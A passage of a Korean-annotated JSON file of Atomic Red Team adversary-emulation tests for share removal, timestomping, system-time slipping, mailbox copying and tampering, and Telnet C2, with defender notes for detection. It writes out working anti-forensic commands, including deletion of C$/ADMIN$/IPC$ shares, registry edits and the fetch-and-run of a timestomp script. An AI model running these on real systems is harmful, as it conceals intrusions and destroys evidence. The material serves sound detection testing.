      "summary": "net share 명령으로 특정 공유를 /delete 옵션으로 제거한다. 공격자의 작업용 공유 흔적을 없애는 전형적인 패턴이다.",

      "prerequisites": [
        "1) Windows 환경에서 net.exe 사용 가능해야 한다.",
        "2) 제거 대상 공유가 이미 생성되어 있어야 한다(앞선 Add Network Share 테스트 등으로 생성).",
        "3) 공유를 삭제할 수 있는 권한(보통 관리자 권한)이 필요하다.",
        "4) Atomic 원본은 #{share_name} 기본값을 \\\\test\\share 로 두고 있지만, 실제 net share /delete는 '공유 이름'을 받는다는 점에 유의해야 한다(예: test). 실습 시 공유 이름과 일치하도록 값 조정 필요."
      ],

      "procedure": [
        "1) net share 명령으로 현재 공유 목록을 확인하고, 삭제할 공유 이름을 확인한다.",
        "2) 아래 명령으로 공유를 삭제한다.",
        "   - net share #{share_name} /delete",
        "   - 실제 환경에서는 #{share_name}을 'test' 같이 공유 이름으로 지정해야 한다.",
        "3) 다시 net share를 실행해 해당 공유가 목록에서 사라졌는지 확인한다.",
        "4) 공격자 관점:",
        "   - 침투 이후 파일 이동/도구 업로드에 사용한 임시 공유를 공격 종료 시점에 삭제해 관리자가 추적하기 어렵게 만들 수 있다.",
        "5) 방어/포렌식 관점:",
        "   - net share XXX /delete 이벤트를 모니터링하고, 삭제된 공유의 생성 시각·사용자·접속 대상 등을 로그에서 역추적해야 한다.",
        "   - 평소 존재하지 않던 공유가 짧은 시간만 존재했다가 삭제되는 패턴은 공격 징후로 볼 수 있다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "net share #{share_name} /delete"
        }
      ]
    },

    {
      "test_id": "0512d214-9512-4d22-bde7-f37e058259b3",
      "name": "Remove Network Share (PowerShell)",
      "platforms": ["windows"],
      "summary": "PowerShell의 Remove-SmbShare, Remove-FileShare를 사용해 SMB/파일 공유를 제거한다. 스크립트형 공격에서 흔히 보일 수 있는 패턴이다.",

      "prerequisites": [
        "1) Windows + PowerShell 환경이 필요하다.",
        "2) SMB/파일 공유 관리용 모듈이 사용 가능한 버전의 Windows(서버/클라이언트)에 있어야 한다.",
        "3) 삭제 대상 공유가 이미 존재해야 한다(이름 #{share_name}).",
        "4) 공유를 삭제할 수 있는 충분한 권한(보통 관리자 권한)이 필요하다.",
        "5) 실습 시에는 운영 중인 중요 공유가 아닌 테스트용 공유에만 사용해야 한다."
      ],

      "procedure": [
        "1) PowerShell을 관리자 권한으로 실행한다(공유 삭제 권한 확보 목적).",
        "2) 현재 공유 상태를 확인한다.",
        "   - Get-SmbShare",
        "3) 아래 명령으로 SMB/파일 공유를 제거한다.",
        "   - Remove-SmbShare -Name #{share_name}",
        "   - Remove-FileShare -Name #{share_name}",
        "   ※ 실제 환경에서는 share_name에 'test'와 같은 공유 이름을 넣어야 하며, UNC 경로가 아닌 '이름'이라는 점을 주의.",
        "4) 다시 Get-SmbShare 등을 실행하여 해당 공유가 삭제되었는지 확인한다.",
        "5) 공격자 관점:",
        "   - PowerShell 스크립트 내에서 침투/확대 과정에 사용한 공유를 코드 한 줄로 정리하면서 흔적을 줄인다.",
        "6) 방어/포렌식 관점:",
        "   - Remove-SmbShare / Remove-FileShare 호출을 Script Block Logging으로 수집하고, 삭제된 공유에 연관된 보안 이벤트(접속·복사·권한 변경 등)를 시계열로 재구성해야 한다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Remove-SmbShare -Name #{share_name}\r\nRemove-FileShare -Name #{share_name}"
        }
      ]
    },

    {
      "test_id": "99c657aa-ebeb-4179-a665-69288fdd12b8",
      "name": "Disable Administrative Share Creation at Startup",
      "platforms": ["windows"],
      "summary": "레지스트리 AutoShareServer / AutoShareWks 값을 0으로 설정해, 부팅 시 자동으로 생성되는 관리자 공유(C$, ADMIN$ 등)를 비활성화한다. 일반적으로는 거의 하지 않는 설정이라, 존재 시 강한 의심 신호가 될 수 있다.",

      "prerequisites": [
        "1) Windows 레지스트리를 수정할 수 있는 관리자 권한이 필요하다.",
        "2) 테스트는 반드시 실험용 환경에서 진행해야 하며, 서버 운영 환경에서 관리자 공유 비활성화는 운영·관리 작업에 영향을 줄 수 있다.",
        "3) reg.exe를 사용할 수 있어야 한다(기본 포함).",
        "4) 변경 전, 현재 레지스트리 값 및 공유 상태를 백업/기록해 두는 것이 좋다."
      ],

      "procedure": [
        "1) 관리자 권한 cmd.exe를 실행한다.",
        "2) 다음 명령으로 관리자 공유 자동 생성 기능을 비활성화한다.",
        "   - reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f",
        "   - reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f",
        "3) 적용을 위해 보통 재부팅 또는 LanmanServer 서비스 재시작이 필요하다.",
        "4) 재부팅 후, net share 명령으로 C$, ADMIN$ 등이 사라졌거나 더 이상 자동 생성되지 않는지 확인한다.",
        "5) 공격자 관점:",
        "   - 자신이 사용 중인 시스템에서 관리자가 원격으로 접근하기 어렵게 만들거나, 일반적인 상태와 다르게 만들어 탐지/감사를 교란할 수 있다.",
        "6) 방어/포렌식 관점:",
        "   - 보안 베이스라인 상 \"관리자 공유가 존재하는 것이 정상\"인 환경에서, 해당 레지스트리 값이 0으로 바뀌어 있고 공유가 사라져 있다면 강력한 침해 지표가 된다.",
        "   - 레지스트리 변경 이벤트와 함께, 시점 전후로 실행된 프로세스·계정 등을 면밀히 조사해야 한다.",
        "7) 복구(클린업) 시에는 테스트에 정의된 cleanup_command를 사용해 레지스트리 값을 삭제해 원래 상태로 되돌릴 수 있다."
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /t REG_DWORD /d 0 /f\r\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /t REG_DWORD /d 0 /f"
        }
      ],
      "cleanup": [
        {
          "executor": "command_prompt",
          "command": "reg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareServer /f\r\nreg delete \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\" /v AutoShareWks /f"
        }
      ]
    },

    {
      "test_id": "4299eff5-90f1-4446-b2f3-7f4f5cfd5d62",
      "name": "Remove Administrative Shares",
      "platforms": ["windows"],
      "summary": "for 루프를 사용해 C$, IPC$, ADMIN$ 관리자 공유를 net share <이름> /delete 로 일괄 제거한다. 랜섬웨어/침해 이후 흔적 제거 및 관리 방해 목적으로 사용된 사례가 있다.",

      "prerequisites": [
        "1) Windows 환경에서 관리자 권한 cmd.exe가 필요하다.",
        "2) LanmanServer 서비스가 활성화되어 있고, 기본 관리자 공유(C$, IPC$, ADMIN$)가 생성된 상태여야 한다.",
        "3) 이 테스트는 시스템 관리·포렌식에 직접적인 영향을 줄 수 있으므로, 반드시 테스트용 환경에서만 수행해야 한다.",
        "4) cleanup_command가 제공되지만, 환경에 따라 완전히 원복되지 않을 수 있으므로 사전에 충분한 백업 및 복구 계획이 필요하다."
      ],

      "procedure": [
        "1) 관리자 권한 cmd.exe를 실행한다.",
        "2) 현재 네트워크 공유 상태를 확인한다.",
        "   - net share",
        "   - C$, ADMIN$, IPC$ 등이 존재하는지 확인.",
        "3) 아래 명령을 실행해 관리자 공유를 한 번에 삭제한다.",
        "   - for %i in (C$ IPC$ ADMIN$) do net share %i /delete",
        "4) 다시 net share를 실행해 위 3개 공유가 목록에서 사라졌는지 확인한다.",
        "5) 공격자 관점:",
        "   - 디지털 포렌식에서 자주 사용하는 C$ 관리 공유를 없애면, 사고 대응자가 원격으로 디스크에 접근하기 어려워지고, 일반적인 상태와 다른 구성으로 혼란을 줄 수 있다.",
        "6) 방어/포렌식 관점:",
        "   - 관리자 공유가 사라진 것 자체가 비정상 징후이며, 특히 랜섬웨어/APT 캠페인에서 보고된 행동과 유사하다.",
        "   - net share C$ /delete 같은 이벤트를 고위험 경보로 설정하고, 그 직전/직후의 프로세스 트리와 계정 활동을 우선적으로 조사해야 한다.",
        "7) 복구(클린업):",
        "   - 테스트 정의된 cleanup_command를 활용해 관리자 공유를 재생성할 수 있다.",
        "     - net share ADMIN$ /UNLIMITED >nul 2>&1",
        "     - net share C$=C:\\ >nul 2>&1",
        "     - net share IPC$ >nul 2>&1"
      ],

      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "for %i in (C$ IPC$ ADMIN$) do net share %i /delete"
        }
      ],
      "cleanup": [
        {
          "executor": "command_prompt",
          "command": "net share ADMIN$ /UNLIMITED >nul 2>&1\r\nnet share C$=C:\\ >nul 2>&1\r\nnet share IPC$ >nul 2>&1"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1070.006",
  "technique_name": "Indicator Removal on Host: Timestomp",
  "tactic": "Defense Evasion",
  "description": "공격자는 파일이나 시스템의 시간 정보(생성 시간, 수정 시간, 마지막 액세스 시간, 시스템 시각)를 조작해 실제 실행·배포 시점을 숨기거나, 다른 정상 파일과 타임라인을 맞춰 포렌식 분석을 방해한다. 이를 일반적으로 '타임스톰프(timestomp)'라고 부르며, 파일 타임스탬프뿐 아니라 이벤트 로그 해석에 쓰이는 시스템 시각까지 조작할 수 있다.",

  "tests": [
    {
      "test_id": "b3b2c408-2ff0-4a33-b89b-1cb46a9e6a9c",
      "name": "Windows - Modify file creation timestamp with PowerShell",
      "platforms": ["windows"],
      "summary": "지정한 파일의 \"생성 시간(CreationTime)\"을 임의의 과거 시간(예: 1970-01-01 00:00:00)으로 변경해, 실제 생성 시점을 숨기는 타임스톰프 기법을 모사한다.",

      "prerequisites": [
        "1) 대상 호스트가 Windows이며 PowerShell 실행이 가능해야 한다.",
        "2) #{file_path} 위치에 대상 파일이 존재해야 한다. Atomic 정의에서는 dependency 단계에서 New-Item + Set-Content로 테스트용 파일을 자동 생성한다.",
        "3) 파일 속성 변경은 일반 사용자 권한에서도 가능하지만, 실제 환경에선 접근 권한이 있어야 한다.",
        "4) 운영 중인 중요 파일이 아닌, 반드시 테스트용 파일 경로를 사용해야 한다."
      ],

      "procedure": [
        "1) PowerShell을 실행한다(테스트용 파일이 있는 경로를 미리 확인).",
        "2) 사전 준비 단계에서 정의된 dependency를 통해 대상 파일을 생성한다.",
        "   - New-Item -Path \"#{file_path}\" -Force | Out-Null",
        "   - Set-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null",
        "3) 아래 명령으로 대상 파일의 생성 시간을 지정한 날짜/시간으로 변경한다.",
        "   - Get-ChildItem \"#{file_path}\" | % { $_.CreationTime = \"#{target_date_time}\" }",
        "4) 파일 탐색기에서 해당 파일 → 우클릭 → 속성(Properties)을 열고, \"만든 날짜(Created)\"가 1970년 등 지정한 시간으로 변경되었는지 확인한다.",
        "5) 공격자 관점:",
        "   - 악성 파일이 실제로는 최근에 생성되었지만, 수년 전으로 생성 시간을 조작해 타임라인 분석에서 눈에 띄지 않게 만들 수 있다.",
        "6) 방어/포렌식 관점:",
        "   - 파일 메타데이터(생성/수정/접근 시간) 간 불일치, $MFT, $LogFile, Prefetch 등 다른 아티팩트와의 타임라인 비교를 통해 조작 흔적을 찾을 수 있다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-ChildItem \"#{file_path}\" | % { $_.CreationTime = \"#{target_date_time}\" }"
        }
      ]
    },

    {
      "test_id": "f8f6634d-93e1-4238-8510-f8a90a20dcf2",
      "name": "Windows - Modify file last modified timestamp with PowerShell",
      "platforms": ["windows"],
      "summary": "지정한 파일의 \"마지막 수정 시간(LastWriteTime)\"을 과거 시간으로 변경해, 실제 변경 시점을 숨기거나 다른 파일과 타임라인을 맞춘다.",

      "prerequisites": [
        "1) Windows + PowerShell 환경이 필요하다.",
        "2) #{file_path} 위치에 대상 파일이 존재해야 한다(Atomic dependency에서 자동 생성).",
        "3) 파일의 속성을 변경할 수 있는 권한이 있어야 한다.",
        "4) 실습은 반드시 테스트용 파일로만 수행해야 한다(운영 중인 중요 파일 금지)."
      ],

      "procedure": [
        "1) PowerShell에서 dependency 단계로 테스트용 파일을 만든다.",
        "   - New-Item -Path \"#{file_path}\" -Force | Out-Null",
        "   - Set-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null",
        "2) 아래 명령으로 마지막 수정 시간을 지정한 값으로 변경한다.",
        "   - Get-ChildItem \"#{file_path}\" | % { $_.LastWriteTime = \"#{target_date_time}\" }",
        "3) 파일 속성에서 \"수정한 날짜(Modified)\"가 1970년 등 지정한 시간으로 변경되었는지 확인한다.",
        "4) 공격자 관점:",
        "   - 특정 시점 이후 생성·수정된 파일만 필터링하는 탐지 로직을 우회할 수 있다.",
        "5) 방어/포렌식 관점:",
        "   - 파일 내용/해시 변경 시점과 LastWriteTime이 맞지 않거나, 다른 로그(Event Log, ShimCache, AmCache 등)와 타임라인이 어긋나는 경우 타임스톰프 의심 지표가 된다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-ChildItem \"#{file_path}\" | % { $_.LastWriteTime = \"#{target_date_time}\" }"
        }
      ]
    },

    {
      "test_id": "da627f63-b9bd-4431-b6f8-c5b44d061a62",
      "name": "Windows - Modify file last access timestamp with PowerShell",
      "platforms": ["windows"],
      "summary": "지정한 파일의 \"마지막 액세스 시간(LastAccessTime)\"을 임의 시간으로 설정해, 실제로 언제 열렸는지 추적하기 어렵게 만든다.",

      "prerequisites": [
        "1) Windows + PowerShell 환경이 필요하다.",
        "2) #{file_path} 위치에 대상 파일이 존재해야 한다(dependency에서 자동 생성).",
        "3) NTFS 볼륨에서 액세스 시간 기록 정책이 비활성화되어 있다면 LastAccessTime이 업데이트되지 않을 수 있다.",
        "4) 역시 운영용이 아닌 테스트용 파일로만 실습해야 한다."
      ],

      "procedure": [
        "1) PowerShell에서 테스트용 파일을 생성한다.",
        "   - New-Item -Path \"#{file_path}\" -Force | Out-Null",
        "   - Set-Content \"#{file_path}\" -Value \"T1551.006 Timestomp\" -Force | Out-Null",
        "2) 아래 명령으로 마지막 액세스 시간을 변경한다.",
        "   - Get-ChildItem \"#{file_path}\" | % { $_.LastAccessTime = \"#{target_date_time}\" }",
        "3) 파일 속성에서 \"액세스한 날짜(Accessed)\"가 지정한 시간으로 바뀌었는지 확인한다.",
        "4) 공격자 관점:",
        "   - 실제로 최근에 파일을 열어도, 오래전에 마지막으로 본 것처럼 보이게 해 분석 시점을 흐릴 수 있다.",
        "5) 방어/포렌식 관점:",
        "   - LastAccessTime만 비정상적으로 과거이거나, 다른 타임스탬프(생성/수정, $MFT 기록 등)와 어울리지 않는 경우 타임스톰프 의심 신호로 볼 수 있다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Get-ChildItem \"#{file_path}\" | % { $_.LastAccessTime = \"#{target_date_time}\" }"
        }
      ]
    },

    {
      "test_id": "d7512c33-3a75-4806-9893-69abc3ccdd43",
      "name": "Windows - Timestomp a File (timestomp.ps1 사용)",
      "platforms": ["windows"],
      "summary": "MITRE APT29 에뮬레이션에서 사용된 timestomp.ps1 스크립트를 가져와 kxwn.lock 파일에 적용하는 실제 타임스톰프 시나리오를 재현한다.",

      "prerequisites": [
        "1) Windows + PowerShell 환경이 필요하다.",
        "2) #{file_path} 디렉터리에 timestomp.ps1가 존재해야 한다.",
        "   - Atomic dependency에서 Invoke-WebRequest로 GitHub에서 다운로드하도록 정의되어 있다.",
        "3) 같은 디렉터리에 kxwn.lock 파일이 존재해야 한다.",
        "   - Atomic dependency에서 New-Item으로 생성한다.",
        "4) 인터넷 연결이 필요할 수 있으며(스クリپ트 다운로드), 이 또한 반드시 실험용 환경에서만 수행해야 한다.",
        "5) timestomp.ps1가 파일의 어떤 타임스탬프를 어떻게 변경하는지 코드를 확인한 후 사용하면 이해에 도움이 된다."
      ],

      "procedure": [
        "1) PowerShell을 관리자 또는 충분한 권한으로 실행한다.",
        "2) dependency 단계 실행:",
        "   - timestomp.ps1 다운로드:",
        "     Invoke-WebRequest \"https://raw.githubusercontent.com/mitre-attack/attack-arsenal/.../timestomp.ps1\" -OutFile \"#{file_path}\\timestomp.ps1\"",
        "   - kxwn.lock 생성:",
        "     New-Item -Path \"#{file_path}\\kxwn.lock\" -ItemType File",
        "3) 타임스톰프 모듈을 임포트한다.",
        "   - Import-Module \"#{file_path}\\timestomp.ps1\"",
        "4) 대상 파일(kxwn.lock)에 타임스톰프를 적용한다.",
        "   - timestomp -dest \"#{file_path}\\kxwn.lock\"",
        "5) 파일 속성 또는 PowerShell(Get-Item)을 통해 생성/수정/접근 시간이 어떻게 변경되었는지 확인한다.",
        "6) 공격자 관점:",
        "   - 공개된 공격 도구(timestomp.ps1)를 그대로 활용해 공격 흔적 파일의 타임라인을 위장할 수 있다.",
        "7) 방어/포렌식 관점:",
        "   - kxwn.lock처럼 특정 이름/확장자의 파일이 비정상적인 시간대에 생성되고, 그 직후 타임스탬프가 한 번에 변경되는 패턴을 탐지하는 룰을 만들 수 있다.",
        "   - 타임라인 분석 시 $MFT, $LogFile, 이벤트 로그 등 다른 출처의 시간과 교차 검증이 필수적이다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "import-module \"#{file_path}\\timestomp.ps1\"\r\ntimestomp -dest \"#{file_path}\\kxwn.lock\""
        }
      ]
    },

    {
      "test_id": "7bcf83bf-f5ef-425c-9d9a-71618ad9ed12",
      "name": "Event Log Manipulations - Time slipping via PowerShell",
      "platforms": ["windows"],
      "summary": "Set-Date를 이용해 시스템 시간을 앞/뒤로 이동시켜(Event Log, 파일 타임스탬프 등) 전체 타임라인을 왜곡하는 기법을 시뮬레이션한다. slipDays.bak에 변경 일수를 기록했다가 cleanup에서 복귀한다.",

      "prerequisites": [
        "1) Windows에서 시스템 시간을 변경할 수 있는 권한(일반적으로 관리자 권한)이 필요하다.",
        "2) Set-Date cmdlet 사용이 허용되어 있어야 하며, 일부 보안 정책에서는 제한될 수 있다.",
        "3) 시스템 시간을 변경하면 도메인 인증, 로그 시간, 로그 분석 등 다양한 영역에 영향을 주므로, 반드시 격리된 실험용 환경에서만 수행해야 한다.",
        "4) 테스트 전 현재 시간을 메모/스크린샷으로 기록해 두면 복구 후 검증에 도움이 된다."
      ],

      "procedure": [
        "1) 관리자 권한 PowerShell을 실행한다.",
        "2) days_to_modify 입력값(기본 3일)을 확인한다. 양수면 미래로, 음수면 과거로 시간을 이동시키는 느낌으로 활용 가능하다.",
        "3) 아래 명령(Atomic executor)을 실행한다.",
        "   try {",
        "     Set-Date -Date (Get-Date).AddDays(#{days_to_modify})",
        "     Add-Content \"$env:APPDATA\\slipDays.bak\" #{days_to_modify}",
        "   } catch { exit 1 }",
        "4) Get-Date, 시스템 트레이 시계, Event Viewer 로그 등에서 시간이 실제로 이동했는지 확인한다.",
        "5) 이 상태에서 생성되는 로그·파일의 타임스탬프가 변경된 시스템 시간을 기준으로 기록되기 때문에, 실제 사건 발생 시각과 로그 상 시각이 불일치하게 된다.",
        "6) cleanup 단계에서 slipDays.bak을 읽어 원래 날짜로 되돌린다.",
        "   - if (Test-Path \"$env:APPDATA\\slipDays.bak\") {",
        "       foreach ($line in (Get-Content $env:APPDATA\\slipDays.bak)) {",
        "         Set-Date -Date (Get-Date).AddDays(-$line)",
        "       }",
        "       rm \"$env:APPDATA\\slipDays.bak\"",
        "     }",
        "7) 공격자 관점:",
        "   - 특정 기간의 로그를 \"시간을 당겨서\" 만들거나, 실제 공격 시점보다 과거/미래로 사건을 밀어 forensic 타임라인을 혼란스럽게 할 수 있다.",
        "8) 방어/포렌식 관점:",
        "   - 시스템 시간 변경 이벤트(Security/System 로그, W32Time 관련 로그 등)를 모니터링하고, 시간 변경 전후의 모든 행위를 우선 조사 대상으로 삼아야 한다.",
        "   - 여러 호스트/도메인 컨트롤러/네트워크 장비의 로그를 상호 비교해, 이상한 시간대의 로그를 교차 검증하는 것이 중요하다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "try{ \r\n  Set-Date -Date (Get-Date).AddDays(#{days_to_modify})\r\n  Add-Content \"$env:APPDATA\\slipDays.bak\" #{days_to_modify}\r\n}\r\ncatch {exit 1}"
        }
      ],
      "cleanup": [
        {
          "executor": "powershell",
          "command": "if(Test-Path \"$env:APPDATA\\slipDays.bak\" ){\r\n  foreach($line in (get-content $env:APPDATA\\slipDays.bak)){\r\n    Set-Date -Date (Get-Date).AddDays(-$line)\r\n  }\r\n  rm \"$env:APPDATA\\slipDays.bak\"\r\n}"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1070.008",
  "technique_name": "Email Collection: Mailbox Manipulation",
  "tactic": "Collection / Defense Evasion",
  "description": "공격자는 로컬 메일 저장소(메일박스)를 별도 위치로 복사한 뒤 삭제하거나, 복사본을 수정해 증거를 훼손·조작할 수 있다. Windows의 Unistore(메일·메시지 저장 경로)를 대상으로 메일 데이터 전체를 복사/삭제/변조하는 행위는 이메일 탈취 및 포렌식 방해에 해당한다.",

  "tests": [
    {
      "test_id": "d29f01ea-ac72-4efc-8a15-bea64b77fabf",
      "name": "Copy and Delete Mailbox Data on Windows",
      "platforms": ["windows"],
      "summary": "Windows 메일 저장소(Unistore) 하위 데이터를 copy 폴더로 통째로 복사한 뒤, 해당 copy 폴더를 삭제하여 메일박스 데이터 복사 후 흔적 제거를 시뮬레이션한다.",

      "prerequisites": [
        "1) 대상 OS가 Windows여야 한다.",
        "2) 경로 `C:\\Users\\<사용자명>\\AppData\\Local\\Comms\\Unistore\\data` 에 메일 관련 파일/폴더가 존재할 수 있다(실제 메일 앱 사용 환경일수록 데이터가 존재).",
        "3) 해당 경로에 대한 읽기/쓰기/삭제 권한이 필요하며, 보통은 로컬 사용자 또는 관리자 권한이 요구된다.",
        "4) 실제 운영 환경의 메일 데이터를 건드리면 손상 가능성이 있으므로, 반드시 실험용 계정·VM에서 수행해야 한다.",
        "5) PowerShell 실행이 허용되어 있어야 하며, Atomic 정의에선 elevation_required: true 로 관리자 권한 실행을 전제한다."
      ],

      "procedure": [
        "1) 관리자 권한 PowerShell을 실행한다.",
        "2) 우선 메일 저장소 경로를 확인한다.",
        "   - `C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data`",
        "3) 아래 명령을 실행해 data 하위에 copy 폴더를 생성하고, 원본 데이터를 copy 폴더로 복사한 뒤 copy 폴더를 삭제한다.",
        "   - New-Item으로 copy 폴더 생성(이미 있으면 무시).",
        "   - Get-ChildItem으로 data 하위의 모든 항목을 나열하되, copy 폴더는 제외( -Exclude copy ).",
        "   - 각 항목을 Copy-Item으로 copy 폴더에 재귀 복사.",
        "   - 마지막에 Remove-Item으로 copy 폴더 전체를 삭제한다.",
        "4) 실행 후 Unistore\\data 경로를 살펴보면 copy 폴더가 남아 있지 않아야 한다.",
        "5) 공격자 관점:",
        "   - 메일박스를 다른 위치로 먼저 복사해 가져간 뒤, 복사 흔적(임시 폴더·파일)을 삭제해 포렌식 분석 시 탐지 난이도를 높일 수 있다.",
        "6) 방어/포렌식 관점:",
        "   - 짧은 시간 동안 대량 파일 복사 + 임시 폴더 생성/삭제 패턴을 감시하고, 특히 Unistore·Outlook PST/OST 경로 등에 대한 비정상적인 대량 I/O를 모니터링하는 탐지 규칙을 설계할 수 있다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\r\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\r\nRemove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore"
        }
      ],

      "cleanup": [
        {
          "executor": "powershell",
          "command": "Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore"
        }
      ]
    },

    {
      "test_id": "edddff85-fee0-499d-9501-7d4d2892e79b",
      "name": "Copy and Modify Mailbox Data on Windows",
      "platforms": ["windows"],
      "summary": "Windows 메일 저장소 데이터를 copy 폴더로 복사한 뒤, 복사된 각 파일에 문자열을 추가해 메일박스 내용을 조작·오염시키는 시나리오를 재현한다.",

      "prerequisites": [
        "1) Windows 환경에서 PowerShell 실행 가능해야 한다.",
        "2) 경로 `C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data` 에 메일 데이터 파일들이 존재해야 한다(또는 실험용으로 임의 파일을 넣어둘 수 있다).",
        "3) 해당 경로에 대한 읽기/쓰기 권한이 필요하며, Atomic 정의에서는 elevation_required: true 로 관리자 권한 실행을 전제한다.",
        "4) 실제 메일 데이터 손상 위험이 있으므로, 반드시 테스트 VM/계정에서만 수행해야 한다.",
        "5) Add-Content 실행 시 파일 형식과 무관하게 문자열이 추가되므로, 바이너리 형식 파일도 손상될 수 있음을 이해해야 한다."
      ],

      "procedure": [
        "1) 관리자 권한 PowerShell을 실행한다.",
        "2) 다음 명령으로 Unistore 메일 데이터 폴더 하위에 copy 폴더를 생성하고, 원본 파일을 모두 복사한다.",
        "   - New-Item 으로 copy 폴더 생성.",
        "   - Get-ChildItem 으로 data 경로의 모든 항목을 나열하되 copy 폴더는 제외.",
        "   - Copy-Item -Recurse 로 copy 폴더에 전체 복제.",
        "3) 복사된 파일들에 대해 Add-Content를 이용해 특정 문자열을 덧붙인다.",
        "   - Get-ChildItem -File 로 copy 폴더 내 파일 목록을 가져온 뒤, 각 파일에",
        "     `\"Modification for Atomic Red Test\"` 문자열을 추가한다.",
        "4) 공격자 관점:",
        "   - 이메일 원문 또는 인덱스 파일을 조작해 일부 메시지를 손상시키거나, 인덱스 불일치를 의도적으로 유발해 사용자가 정상적으로 메일을 열지 못하게 할 수 있다.",
        "   - 또는 포렌식 시 분석가가 '오염된' 사본만 보게 만들어 실제 원본과 다른 내용을 보게 할 수도 있다.",
        "5) 방어/포렌식 관점:",
        "   - 메일 데이터 디렉터리 내 대량 파일 복사 후, 짧은 시간 내 수십~수백 개 파일의 크기 증가/내용 변경이 감지되면 조작 가능성을 의심할 수 있다.",
        "   - 백업/저널링 메일 서버와 비교해 로컬 저장소의 변조 여부를 검증하는 절차를 설계할 수 있다.",
        "6) 테스트 후에는 Atomic의 cleanup 명령으로 copy 폴더를 제거해 환경을 원복할 수 있다."
      ],

      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\r\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\r\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -File | ForEach-Object { Add-Content -Path $_.FullName -Value \"Modification for Atomic Red Test\" -ErrorAction Ignore }"
        }
      ],

      "cleanup": [
        {
          "executor": "powershell",
          "command": "Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore"
        }
      ]
    }
  ]
},
{
  "technique_id": "T1071",
  "technique_name": "Application Layer Protocol",
  "tactic": "Command and Control",
  "description": "공격자는 Telnet, HTTP(S), DNS, SMTP 등 애플리케이션 계층 프로토콜을 이용해 C2(Command & Control) 채널을 구축한다. 정상 트래픽처럼 위장되기 쉬워 탐지가 어렵고, 이미 허용된 포트/프로토콜 위에서 통신하기 때문에 방화벽·프록시 우회를 노릴 수 있다. 이 테스트는 Telnet 기반 C2 통신을 모사한다.",

  "tests": [
    {
      "test_id": "3b0df731-030c-4768-b492-2a3216d90e53",
      "name": "Telnet C2",
      "platforms": ["windows"],
      "summary": "Windows 클라이언트에서 telnet_client.exe를 이용해 지정된 IP/포트의 Telnet C2 서버와 세션을 맺어 C2 통신을 모사한다.",

      "prerequisites": [
        "1) 대상 OS는 Windows여야 한다.",
        "2) C2 서버 역할을 하는 호스트에서 `telnet_server.exe`(예: PathToAtomicsFolder\\T1071\\bin\\telnet_server.exe)를 미리 실행해 두어야 한다.",
        "3) 테스트용 Windows 클라이언트에서 해당 C2 서버 IP(또는 도메인)와 포트(기본 23/TCP)로의 네트워크 통신이 가능해야 한다 (방화벽, 보안 솔루션 정책에 의해 차단되지 않아야 함).",
        "4) client 에이전트(`telnet_client.exe`)가 로컬 디스크의 지정된 경로에 존재해야 한다 (기본: PathToAtomicsFolder\\T1071\\bin\\telnet_client.exe).",
        "5) PowerShell에서 `Test-NetConnection` 사용이 가능해야 한다 (Windows 8.1 이상 또는 해당 모듈이 포함된 환경).",
